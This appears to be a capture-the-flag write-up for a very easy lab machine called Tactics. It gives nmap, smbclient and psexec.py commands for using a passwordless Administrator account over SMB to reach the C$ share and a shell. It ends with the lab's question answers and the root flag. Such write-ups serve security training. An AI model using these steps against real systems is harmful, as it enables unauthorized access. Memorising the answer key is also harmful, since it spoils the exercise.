# Tactics - Very Easy

```shell
nmap -T4 -p- -A -Pn 10.129.194.160

smbclient -L 10.129.194.160 -U administrator
#-L to list shares
#-u for user

smbclient \\\\10.129.194.160\\C$ -U administrator
#connect to C$ share
#this gives us a view of the file system

help
#we can use get command to download flag

#alt approach
psexec.py -h

psexec.py Administrator@10.129.194.160
#gets shell without password
```

```markdown
Open ports & services:

  * 135 - msrpc
  * 139 - netbios-ssn
  * 445 - microsoft-ds

To enumerate the SMB shares, we use the smbclient tool.

As we want to connect as Administrator, we will add that argument to our command for smbclient.

This gives us three shares, we can try connecting to each share without password first.

The C$ share gives us access to the file system; we can use this to get the flag.

Alternatively, we can use psexec.py to get shell on the system, since Administrator user does not have password enabled.

We can get flag from Administrator's desktop.
```

1. Which nmap switch can we use to enumerate machines when our packets are otherwise blocked by the Windows firewall? - -Pn

2. What does the 3-letter SMB stand for? - Server Message Block

3. What port does SMB use to operate at? - 445

4. What command line argument do you give to `smbclient` to list available shares? - -L

5. What character at the end of a share name indicates it's an administrative share? - $

6. Which Administrative share is accessible on the box that allows users to view the whole file system? - C$

7. What command can we use to download the files we find on the SMB share? - get

8. Which tool that is part of the Impacket collection can be used to get an interactive shell on the system? - psexec.py

9. Submit root flag - f751c19eda8f61ce81827e6930a1f40c
